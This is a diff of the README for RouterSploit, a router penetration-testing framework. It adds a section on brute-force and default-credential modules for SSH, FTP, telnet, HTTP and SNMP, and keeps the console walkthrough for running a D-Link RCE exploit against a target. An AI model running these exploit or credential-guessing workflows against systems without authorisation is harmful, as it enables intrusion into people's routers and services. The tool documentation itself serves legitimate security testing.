@@ -16,8 +16,6 @@ It consists of various modules that aids penetration testing operations:
 
 # Usage
 
-## Run
-
 	root@kalidev:~/git/routersploit# ./rsf.py 
 	 ______            _            _____       _       _ _
 	 | ___ \          | |          /  ___|     | |     (_) |
@@ -34,7 +32,9 @@ It consists of various modules that aids penetration testing operations:
 
 	rsf > 
 
-## Pick the module
+## 1. Exploits
+
+### Pick the module
 
 	rsf > use exploits/
 	exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
@@ -43,7 +43,7 @@ It consists of various modules that aids penetration testing operations:
 
 U can use tab key for completion.
 
-## Options
+### Options
 
 Display module options:
 
@@ -62,7 +62,7 @@ Set options:
 	rsf (D-LINK DIR-300 & DIR-600 RCE) > set target http://192.168.1.1
 	[+] {'target': 'http://192.168.1.1'}
 
-## Exploit
+### Run module
 
 Exploiting target can be achieved by issuing 'run' or 'exploit' command:
 
@@ -77,7 +77,7 @@ It is also possible to check if the target is vulnerable to particular exploit:
 	rsf (D-LINK DIR-300 & DIR-600 RCE) > check
 	[+] Target is vulnerable
 
-## Info
+### Info
 
 Display information about exploit:
 
@@ -101,6 +101,91 @@ Display information about exploit:
 	- http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router
 	- http://www.s3cur1ty.de/home-network-horror-days
 	- http://www.s3cur1ty.de/m1adv2013-003
+
+## 2. Creds
+
+### Pick module
+
+Modules located under creds/ directory allow running dictionary attacks against various network services.
+
+Following services are currently supported:
+
+- ftp
+- ssh
+- telnet
+- http basic auth
+- http form auth
+- snmp
+
+Every service has been divided into two modules:
+
+- default (e.g. ssh_default) - this kind of modules use one wordlist with default credentials pairs login:password. Module can be quickly used and in matter of seconds verify if the device uses default credentials.  
+- bruteforce (e.g. ssh_bruteforce) - this kind of modules perform dictionary attacks against specified account or list of accounts. It takes two parameters login and password. These values can be a single word (e.g. 'admin') or entire list of strings (file:///root/users.txt).
+
+Console:
+
+    rsf > use creds/
+    creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default         
+    creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce      
+    rsf > use creds/ssh_default
+    rsf (SSH Default Creds) > 
+
+### Options
+
+    rsf (SSH Default Creds) > show options
+    
+    Target options:
+    
+       Name       Current settings     Description           
+       ----       ----------------     -----------           
+       target                          Target IP address     
+       port       22                   Target port           
+    
+    
+    Module options:
+    
+       Name         Current settings                                                      Description                                              
+       ----         ----------------                                                      -----------                                              
+       threads      8                                                                     Numbers of threads                                       
+       defaults     file:///root/git/routersploit/routersploit/wordlists/defaults.txt     User:Pass or file with default credentials (file://)
+
+
+Set target:
+
+    rsf (SSH Default Creds) > set target 192.168.1.53
+    [+] {'target': '192.168.1.53'}
+
+
+### Run module
+
+    rsf (SSH Default Creds) > run
+    [*] Running module...
+    [*] worker-0 process is starting...
+    [*] worker-1 process is starting...
+    [*] worker-2 process is starting...
+    [*] worker-3 process is starting...
+    [*] worker-4 process is starting...
+    [*] worker-5 process is starting...
+    [*] worker-6 process is starting...
+    [*] worker-7 process is starting...
+    [-] worker-4 Authentication failed. Username: '3comcso' Password: 'RIP000'
+    [-] worker-1 Authentication failed. Username: '1234' Password: '1234'
+    [-] worker-0 Authentication failed. Username: '1111' Password: '1111'
+    [-] worker-7 Authentication failed. Username: 'ADVMAIL' Password: 'HP'
+    [-] worker-3 Authentication failed. Username: '266344' Password: '266344'
+    [-] worker-2 Authentication failed. Username: '1502' Password: '1502'
+	
+    (..)
+
+    Elapsed time:  38.9181981087 seconds
+    [+] Credentials found!
+	
+    Login     Password     
+    -----     --------     
+    admin     1234         
+
+    rsf (SSH Default Creds) > 
+	
 
 # License
 
